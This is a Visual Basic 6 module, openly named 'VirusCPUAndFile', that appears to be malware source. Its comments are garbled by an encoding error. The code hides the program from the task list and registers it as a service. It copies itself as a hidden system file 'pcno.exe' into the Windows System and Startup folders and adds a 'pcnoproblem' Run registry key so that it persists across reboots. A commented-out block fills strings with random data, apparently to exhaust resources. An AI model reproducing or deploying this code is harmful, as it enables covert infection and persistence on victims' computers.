Attribute VB_Name = "VirusCPUAndFile"
Public i As Integer
Public Declare Function GetCurrentProcessid Lib "kernel32" () As Long
Public Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessID As Long, ByVal dwType As Long)
Public Const RSP_SIMPLE_SERVICE = 1
Public Const RSP_UNREGISTER_SERVICE = 0
Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long '�ŧiGetSystemDirectory API���
Declare Function SetFileAttributes Lib "kernel32" Alias "SetFileAttributesA" (ByVal lpFileName As String, ByVal dwFileAttributes As Long) As Long '�ŧiSetFileAttributes API���
Dim SDir As String '�x�s�t��System���|
Dim runDir As String '�x�s�u�Ұʡv���|
Public Sub MakeMeService()
Dim pid As Long
Dim resery As Long
pid = GetCurrentProcessid()
regserv = RegisterServiceProcess(pid, RSP_SIMPLE_SERVICE)
End Sub
Public Sub Main()
   'On Error Resume Next
   Randomize
   If App.PrevInstance Then End '����f�r���ж}�ҡA�y�����~
   App.TaskVisible = False '�b�u�@�޲z�����è���
   
   Call GetSDir '���oSYSTEM���|
   Call GetRunDir '���o�u�Ұʡv���|
   Dim wshshell As Object '�ŧiwshshell���@��Object
   Set wshshell = CreateObject("wscript.shell") '�N"wscript.shell"���J��wshshell��
   Dim ToPath As String '�x�s�ؼи��|
   
   '�f�r�֤� Start
   If App.Path <> "C:\Documents and Settings\User" Then
      'FileCopy (App.Path & "\svchost.exe"), ("C:\Documents and Settings\User\svchost.exe")
   End If
   'For i = 0 To 10 '999
   '   If Int(i / 10) = 0 Then
   '      CountZero = "00"
   '   ElseIf Int(i / 100) >= 1 Then
   '      CountZero = ""
   '   Else
   '      CountZero = "0"
   '   End If
   '   For j = 0 To 10 '44000
   '      Words = Words + String(44000, Int(Rnd * 128))
   '   Next
   '
   '   If i = 10 Then
   '      i = 0
   '   End If
   'Next
   '�f�r�֤� End
   
   ToPath = SDir + "pcno.exe" ' '��ToPath���VSystem�ؿ��U��pcno.exe
   SetFileAttributes ToPath, 0 '�T�OSystem�ؿ��U��pcno.exe�L�����ݩʡA�H�K�X�t��
   If Dir(ToPath) = "" Then '�P�_System�ؿ��U��pcno.exe�O�_�s�b�A�p�GSystem�ؿ��U��pcno.exe���s�b
       FileCopy App.Path & "\" & App.EXEName & ".EXE", ToPath '�N�{���ۨ��ƻs��System�ؿ��U�A�ɦW���upcno.exe�v
   End If
   SetAttr ToPath, vbHidden + vbSystem '�ק�System�ؿ��U��pcno.exe�ݩʬ�����+�t��
   
   wshshell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\pcnoproblem", ToPath '�NSystem�ؿ��U��pcno.exe���|�g�J��}���}�ҵ{�����n�����X��

   ToPath = runDir + "pcno.exe" '��ToPath���V�u�Ұʡv�ؿ��U��pcno.exe
   SetFileAttributes ToPath, 0 '�T�O�u�Ұʡv�ؿ��U��pcno.exe�L�����ݩʡA�H�K�X�t��
   If Dir(ToPath) = "" Then '�P�_�u�Ұʡv�ؿ��U��pcno.exe�O�_�s�b
       FileCopy App.Path & "\" & App.EXEName & ".EXE", ToPath '�N�{���ۨ��ƻs��u�Ұʡv�ؿ��U�A�ɦW���upcno.exe�v
   End If
   SetAttr ToPath, vbHidden + vbSystem  '�ק�u�Ұʡv�ؿ��U��pcno.exe�ݩʬ�����+�t��

   End '�����{��
End Sub
Sub GetSDir() '���oSYSTEM���|
    Dim rtn As Long '�x�sGetSystemDirectory��return��
    Dim Buffer As String '�@��lpBuffer
    Const MAX_PATH = 260 '�]�w�̤j�r�����

    Buffer = Space(MAX_PATH) '��Buffer�x�sMAX_PATH(260)�Ӫťզr��
    rtn = GetSystemDirectory(Buffer, Len(Buffer)) 'GetSystemDirectory(lpBuffer,nSize)
    If rtn = 0 Then '�P�_GetSystemDirectory�O�_�����o���|
        End '�����{��
    Else '�p�Grtn����0
        SDir = Left(Buffer, rtn) 'SDir�x�sSystem���|�CLeft���Ϊk�O���XBuffer����System���|�����Frtn���ɬ�System���|���r�����
    End If
End Sub
Sub GetRunDir() '���o�u�Ұʡv���|
    Dim wshshell As Object '�ŧiwshshell���@��Object
    Set wshshell = CreateObject("wscript.shell") '�N"wscript.shell"���J��wshshell��
    runDir = wshshell.regread("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Startup") '���o�Ұʸ��|
End Sub
